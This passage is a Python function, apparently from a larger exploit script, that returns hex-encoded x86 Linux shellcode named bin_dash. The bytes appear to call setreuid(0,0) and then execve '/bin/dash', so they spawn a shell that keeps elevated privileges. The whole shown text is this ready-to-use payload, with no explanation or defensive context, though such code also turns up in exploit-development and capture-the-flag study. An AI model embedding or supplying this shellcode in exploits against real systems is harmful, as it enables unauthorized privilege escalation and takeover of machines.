...
def bin_dash():
	shellcode =  r"\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x90\x90\x90\x68\x58\xc1\xe8\x10"
	shellcode += r"\xc1\xe8\x08\x50\x68\x2f\x64\x61\x73\x68\x2f"
	shellcode += r"\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80\xb0\x01\xb3\x01\xcd\x80"
	return shellcode
